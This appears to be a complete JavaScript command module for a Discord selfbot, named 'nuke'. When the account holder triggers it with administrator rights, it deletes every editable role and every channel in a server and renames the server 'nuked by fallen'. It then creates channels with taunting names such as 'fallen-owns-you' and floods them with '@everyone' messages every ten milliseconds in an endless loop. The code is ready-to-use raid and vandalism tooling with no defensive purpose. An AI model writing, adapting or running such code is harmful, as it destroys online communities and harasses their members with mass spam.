import { log } from '../../utils/functions.js';

export default {
    name: 'nuke',
    description: 'Nuke the server - delete all channels/roles, recreate channels, spam them all simultaneously',
    aliases: ['nukesv', 'ns'],
    usage: '[message]',
    category: 'misc',
    type: 'server_only',
    permissions: ['Administrator'],
    cooldown: 60,

    execute: async (client, message, args) => {
        if (message.author.id !== client.user.id) return;

        const nukeMsg = args.length ? args.join(' ') : '@everyone fallen was here 💀';
        const guild = message.guild;

        // Channel names to create
        const { loadConfig } = await import('../../utils/functions.js');
        const config = loadConfig();
        const channelNames = config.nuke?.channels?.length
            ? config.nuke.channels
            : ['nuked-by-fallen', 'fallen-was-here', 'rip-this-server', 'fallen-owns-you', 'get-wrecked'];
        const serverName = config.nuke?.server_name || 'nuked by fallen';

        try {
            await message.delete().catch(() => {});
        } catch {}

        const roles = [...guild.roles.cache.values()].filter(r => r.id !== guild.id && r.editable);
        const channels = [...guild.channels.cache.values()];

        await Promise.allSettled([
            ...roles.map(r => r.delete().catch(() => {})),
            ...channels.map(c => c.delete().catch(() => {})),
            guild.setName(serverName).catch(() => {}),
        ]);

        const created = await Promise.allSettled(
            channelNames.map(name =>
                guild.channels.create(name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, ''), {
                    type: 0
                }).catch(() => null)
            )
        );

        const newChannels = created
            .filter(r => r.status === 'fulfilled' && r.value)
            .map(r => r.value);

        if (!newChannels.length) return;

        client._nukeSpam = { active: true, channels: newChannels };

        const spamChannel = async (ch) => {
            while (client._nukeSpam?.active) {
                try {
                    await ch.send(nukeMsg);
                } catch {}
                await new Promise(r => setTimeout(r, 10));
            }
        };

        // Start spamming ALL channels simultaneously
        newChannels.forEach(ch => spamChannel(ch));
    }
};
